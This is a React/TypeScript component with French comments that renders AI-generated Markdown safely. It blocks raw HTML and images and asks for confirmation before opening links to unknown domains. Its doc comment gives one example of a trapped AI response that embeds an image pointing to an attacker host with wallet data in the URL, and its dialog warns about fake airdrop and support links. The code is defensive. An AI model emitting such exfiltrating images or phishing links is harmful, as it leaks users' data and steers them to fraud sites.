import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import { linkInfo } from '../lib/links';
import { openExternal } from '../lib/platform';

/**
 * Rendu Markdown sûr pour les textes de l'IA :
 *  - pas de HTML brut ;
 *  - AUCUNE image : une réponse piégée pourrait glisser ![](https://pirate/?portefeuille=…) et faire fuiter des données à l'affichage ;
 *  - les liens montrent leur vrai domaine et demandent confirmation s'il est inconnu.
 */
export function Markdown({ children }: { children: string }) {
  return (
    <div className="prose-ai">
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        components={{
          img: ({ alt }) => <span className="text-muted">[image non affichée{alt ? ` : ${alt}` : ''}]</span>,
          a: ({ href, children: c }) => {
            const info = linkInfo(href);
            return (
              <a
                href={info.ok ? href : undefined}
                onClick={(e) => {
                  e.preventDefault();
                  if (!info.ok || !href) return;
                  if (!info.trusted && !window.confirm(`Ce lien ouvre « ${info.host} ».\n\nUne réponse d’IA peut contenir de faux liens (faux sites de réclamation d’airdrop, faux supports). Vérifie que c’est bien le site attendu avant de continuer.\n\nOuvrir ce site ?`)) return;
                  openExternal(href);
                }}
              >
                {c}
                {info.host && <sup className="ml-0.5 text-[0.65rem] font-normal text-muted">{info.ok ? info.host : `${info.host} (non ouvert)`}</sup>}
              </a>
            );
          },
        }}
      >
        {children}
      </ReactMarkdown>
    </div>
  );
}
